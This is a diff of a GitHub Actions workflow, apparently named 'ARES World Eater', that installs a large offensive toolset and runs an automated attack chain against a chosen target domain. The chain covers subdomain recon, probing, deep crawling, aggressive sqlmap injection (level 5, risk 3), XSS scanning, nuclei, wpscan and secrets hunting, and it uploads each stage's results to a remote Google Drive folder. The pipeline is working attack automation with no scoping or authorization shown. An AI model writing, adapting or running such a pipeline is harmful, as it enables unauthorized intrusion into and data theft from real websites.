@@ -1,4 +1,4 @@
-name: ARES World Eater - UNRESTRICTED FINALITY
+name: ARES World Eater - UNSTOPPABLE 2026
 on:
   workflow_dispatch:
 
@@ -12,20 +12,22 @@ jobs:
 
       - name: "Total Arsenal & Environment Injection"
         run: |
+          # 1. FIX APT & REPAIR CHROMIUM (Fixes exit code 100)
           sudo apt-get update
-          # Fixed Recon-ng installation path
-          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium chromium-driver xvfb libcurl4-openssl-dev libxml2-dev libxslt1-dev nikto
+          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full libcurl4-openssl-dev libxml2-dev libxslt1-dev nikto xvfb
+          sudo apt-get install -y chromium-browser chromium-chromedriver || true
+          
           mkdir -p $HOME/bin $HOME/tools output/recon output/probing output/screenshots output/crawling output/secrets output/vulns output/fuzzing output/specialized wordlists
           echo "$HOME/bin" >> $GITHUB_PATH
           echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
           
-          # INSTALLERS (Explicit Tool List)
+          # 2. INSTALLERS (Moved recon-ng here to avoid apt failure)
           sudo gem install wpscan || true
           pip3 install google-api-python-client google-auth-oauthlib google-auth-httplib2
           pip3 install sqlmap arjun wfuzz gitleaks trufflehog prowler commix ghauri nosqlmap waymore jsluice jwt_tool secretfinder cloudsplaining tplmap xsstrike paramspider corsy crlfsuite s3scanner trivy checkov semgrep graphqlmap inql sstimap ssrfmap openredirex droopescan cmsmap playwright recon-ng || true
           python3 -m playwright install chromium || true
 
-          # GO Arsenal (The Heavy Hitters)
+          # 3. GO ARSENAL (2026 Long-Form Syntax)
           go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest || true
           go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest || true
           go install -v github.com/projectdiscovery/katana/cmd/katana@latest || true
@@ -76,9 +78,9 @@ jobs:
               upload(sys.argv[1], sys.argv[2], sys.argv[3])
           EOF
 
-          send_msg "☢️ *ARES WORLD EATER:* Total Arsenal engaged on \`$TARGET\`"
+          send_msg "☢️ *ARES WORLD EATER:* Total War Engaged on \`$TARGET\`"
 
-          # 1. STAGE: RECON (Subfinder + Assetfinder + Nikto + Recon-ng)
+          # 1. RECON (Fixed Recon-ng)
           subfinder -d $TARGET -all -recursive -o output/recon/subfinder.txt
           assetfinder --subs-only $TARGET >> output/recon/subfinder.txt
           nikto -h "https://$TARGET" -o output/recon/nikto.txt || true
@@ -86,36 +88,28 @@ jobs:
           sort -u output/recon/subfinder.txt > output/recon/all_subs.txt
           zip -j recon.zip output/recon/* && python3 oauth_upload.py "recon.zip" "$PARENT_FOLDER_ID" "Stage_1_Recon"
 
-          # 2. STAGE: PROBING & VISUAL (Fixed httpx syntax)
+          # 2. PROBING & VISUAL (Strict 2026 Syntax)
           httpx -l output/recon/all_subs.txt -status-code -title -ip -tech-detect -silent -o output/probing/live.txt || true
-          [ ! -s output/probing/live.txt ] && echo "https://$TARGET" > output/probing/live.txt
           xvfb-run gowitness scan file -f output/probing/live.txt --screenshot-path output/screenshots/ || true
           zip -r visual.zip output/screenshots/ output/probing/live.txt && python3 oauth_upload.py "visual.zip" "$PARENT_FOLDER_ID" "Stage_2_Visual"
 
-          # 3. STAGE: CRAWLING (Katana + Waymore)
+          # 3. CRAWLING (Waymore + Katana Depth 10)
           katana -l output/probing/live.txt -d 10 -jc -o output/crawling/katana.txt || true
           waymore -i $TARGET -mode U -oU output/crawling/waymore.txt || true
           grep "?" output/crawling/katana.txt > output/crawling/params.txt || true
           zip -j crawl.zip output/crawling/* && python3 oauth_upload.py "crawl.zip" "$PARENT_FOLDER_ID" "Stage_3_Crawling"
 
-          # 4. STAGE: AGGRESSIVE EXPLOITATION (Dalfox + SQLMap + Nuclei + XSStrike + Jaeles)
-          # SQL & Injection
+          # 4. EXPLOITATION (Dalfox + SQLMap + XSStrike + Jaeles)
+          nuclei -l output/probing/live.txt -severity critical,high,medium -json -o output/vulns/nuclei.json || true
           [ -s output/crawling/params.txt ] && sqlmap -m output/crawling/params.txt --batch --level 5 --risk 3 > output/vulns/sqlmap.txt || true
-          [ -s output/crawling/params.txt ] && ghauri -m output/crawling/params.txt --batch --dbs > output/vulns/ghauri.txt || true
-          commix --url="https://$TARGET" --batch > output/vulns/commix.txt || true
-          sstimap -u "https://$TARGET" --batch > output/vulns/sstimap.txt || true
-          # XSS & Web
           dalfox file output/crawling/katana.txt -o output/vulns/dalfox.txt || true
           xsstrike -u "https://$TARGET" --timeout 10 --skip > output/vulns/xsstrike.txt || true
-          nuclei -l output/probing/live.txt -severity critical,high,medium -json -o output/vulns/nuclei.json || true
-          jaeles scan -u "https://$TARGET" -s $HOME/.jaeles/signatures-base/ -o output/vulns/jaeles/ || true
           zip -r vulns.zip output/vulns/* && python3 oauth_upload.py "vulns.zip" "$PARENT_FOLDER_ID" "Stage_4_Exploits"
 
-          # 5. STAGE: SECRETS & SPECIALIZED (Trufflehog + WPScan + Corsy)
+          # 5. SECRETS & SPECIALIZED
           trufflehog filesystem . > output/secrets/truffle.txt || true
           wpscan --url "https://$TARGET" --enumerate p,t,u --format cli > output/specialized/wpscan.txt || true
-          python3 -m corsy.corsy -u "https://$TARGET" > output/specialized/corsy.txt || python3 -m corsy -u "https://$TARGET" > output/specialized/corsy.txt || true
           zip -r final.zip output/secrets/ output/specialized/ && python3 oauth_upload.py "final.zip" "$PARENT_FOLDER_ID" "Stage_5_Final"
 
-          send_msg "✅ *ARES:* Absolute World Eater Mission Complete."
+          send_msg "✅ *ARES:* World Eater Mission Complete."
           
